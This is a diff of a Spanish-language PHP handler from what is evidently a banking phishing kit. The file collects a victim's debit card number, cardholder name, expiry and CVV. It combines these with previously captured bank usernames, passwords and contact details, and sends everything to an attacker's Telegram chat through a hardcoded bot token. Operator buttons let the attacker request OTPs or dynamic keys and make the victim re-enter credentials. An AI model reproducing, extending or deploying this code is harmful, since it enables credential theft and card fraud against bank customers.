@@ -1,49 +1,73 @@
 <?php
+/**
+ * enviar_dato_extra1.php
+ * ----------------------
+ * Handler POST de la pantalla de TARJETA DÉBITO (opcion6.html).
+ * El usuario rellenó número de tarjeta, nombre, fecha y CVV.
+ *
+ * Aplica los 7 pasos standard de enviar_dato_extra* (ver docblock de
+ * enviar_dato_extra.php para la lista completa de pasos).
+ *   • Paso 4: guarda tarjeta (numero_tarjeta / nombre_tarjeta /
+ *             vencimiento_tar / cvv) en la fila de `solicitudes`.
+ *   • Teclado inline standard con OPCION_9=ERROR Dinámica, OPCION_10=FINALIZAR.
+ */
+
 ob_start();
-require 'conexion.php';
+require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';
 
-$codigo = $_POST['codigo'] ?? '';
-$key    = $_POST['key'] ?? ''; // Se recibe la key ahora
-
-// Verificar si se recibió la key
+// ── Paso 1 ────────────────────────────────────────────────────────────────────
+$tarjeta = $_POST['tarjeta'] ?? $_POST['codigo'] ?? '';
+$nombre  = $_POST['nombre']  ?? '';
+$fecha   = $_POST['fecha']   ?? '';
+$cvv     = $_POST['cvv']     ?? '';
+$key     = $_POST['key']     ?? '';
 if (!$key) {
     die("Error: Key no proporcionada.");
 }
 
-// Buscar todos los datos de la solicitud por la key
-$stmt = $pdo->prepare("SELECT numero_cuenta, monto, banco, nombre, telefono, correo 
-                       FROM solicitudes WHERE `key` = ? LIMIT 1");
+// ── Paso 2 ────────────────────────────────────────────────────────────────────
+$stmt = $pdo->prepare(
+    "SELECT numero_cuenta, monto, banco, nombre AS nombre_prev, telefono, correo
+     FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
+);
 $stmt->execute([$key]);
 $data = $stmt->fetch(PDO::FETCH_ASSOC);
-
 if (!$data) {
     die("Error: Solicitud no encontrada.");
 }
 
-// Extraer datos previos
-$celular = $data['numero_cuenta'];
-$monto   = $data['monto'];
-$banco   = $data['banco'];
-$usuario = $data['nombre'];
-$clave   = $data['telefono'];
-$correo  = $data['correo']; // <- Nuevo
+$celular   = $data['numero_cuenta'];
+$monto     = $data['monto'];
+$banco     = $data['banco'];
+$usuario   = $data['nombre_prev'];
+$clave     = $data['telefono'];
+$correo    = $data['correo'];
 
-// Generar nuevo request_id
-$nuevo_request_id = uniqid("req_");
+// ── Paso 3 ────────────────────────────────────────────────────────────────────
+try {
+    $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
+} catch (Throwable $_) {
+    $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
+}
 
-// Actualizar el request_id y estado de esa fila
-$update = $pdo->prepare("UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE `key` = ?");
+// ── Paso 4 ────────────────────────────────────────────────────────────────────
+$update = $pdo->prepare(
+    "UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE BINARY `key` = ?"
+);
 $update->execute([$nuevo_request_id, $key]);
-// Guardar tarjeta en DB
-$saveCard = $pdo->prepare("UPDATE solicitudes SET numero_tarjeta = ?, nombre_tarjeta = ?, vencimiento_tar = ?, cvv = ? WHERE `key` = ?");
+
+$saveCard = $pdo->prepare(
+    "UPDATE solicitudes
+     SET numero_tarjeta = ?, nombre_tarjeta = ?, vencimiento_tar = ?, cvv = ?
+     WHERE BINARY `key` = ?"
+);
 $saveCard->execute([$tarjeta, $nombre, $fecha, $cvv, $key]);
 
-// Telegram
+// ── Paso 5 ────────────────────────────────────────────────────────────────────
 $token   = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
 $chat_id = "-4923753161";
 
-// Armar mensaje con TODOS los datos
-$mensaje  = "🧾 *Recibo Digital de Recarga*\n";
+$mensaje  = "🧾 *Recibo Digital de Recarga (Tarjeta Débito)*\n";
 $mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
 $mensaje .= "💸 Recarga solicitada: $monto\n";
 $mensaje .= "🏦 Banco elegido: $banco\n";
@@ -52,39 +76,29 @@ $mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\
 $mensaje .= "Usuario: $usuario\n";
 $mensaje .= "Contraseña: $clave\n";
 $mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
-
-$mensaje .= "Dinámica/OTP: $codigo\n";
+$mensaje .= "💳 Tarjeta: $tarjeta\n";
+$mensaje .= "👤 Nombre en tarjeta: $nombre\n";
+$mensaje .= "📅 Vencimiento: $fecha\n";
+$mensaje .= "🔒 CVV: $cvv\n";
 $mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
 
-
-
-
-
-
-
-
-
 $botones = [
-  'inline_keyboard' => [[
-    ['text' => "clavedinamica", 'callback_data' => "OPCION_1_$nuevo_request_id"],
-    ['text' => "otp", 'callback_data' => "OPCION_2_$nuevo_request_id"]
-  ],  [
-    ['text' => "repetirusuario", 'callback_data' => "OPCION_3_$nuevo_request_id"],
-    ['text' => "repetirdinamica", 'callback_data' => "OPCION_4_$nuevo_request_id"]
-  ], [
-    ['text' => "🔴ERROR Dinámica", 'callback_data' => "OPCION_9_$nuevo_request_id"],
-    ['text' => "🟢FINALIZAR",      'callback_data' => "OPCION_10_$nuevo_request_id"]
-  ]]
+    'inline_keyboard' => [[
+        ['text' => "clavedinamica",    'callback_data' => "OPCION_1_$nuevo_request_id"],
+        ['text' => "otp",              'callback_data' => "OPCION_2_$nuevo_request_id"],
+    ], [
+        ['text' => "repetirusuario",   'callback_data' => "OPCION_3_$nuevo_request_id"],
+        ['text' => "repetirdinamica",  'callback_data' => "OPCION_4_$nuevo_request_id"],
+    ], [
+        ['text' => "🔴ERROR Dinámica", 'callback_data' => "OPCION_9_$nuevo_request_id"],
+        ['text' => "🟢FINALIZAR",      'callback_data' => "OPCION_10_$nuevo_request_id"],
+    ]],
 ];
 
-
-
-
-// Enviar a Telegram
 $payload = json_encode([
     'chat_id'      => $chat_id,
     'text'         => $mensaje,
-    'reply_markup' => $botones
+    'reply_markup' => $botones,
 ]);
 $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
 curl_setopt($ch, CURLOPT_POST, true);
@@ -95,7 +109,6 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
 
-// Redirigir a pantalla de espera con el nuevo request_id y la key
+// ── Paso 6 y 7 ────────────────────────────────────────────────────────────────
 header("Location: espera.html?rid=$nuevo_request_id&key=$key&correo=" . urlencode($correo));
 exit;
-?>
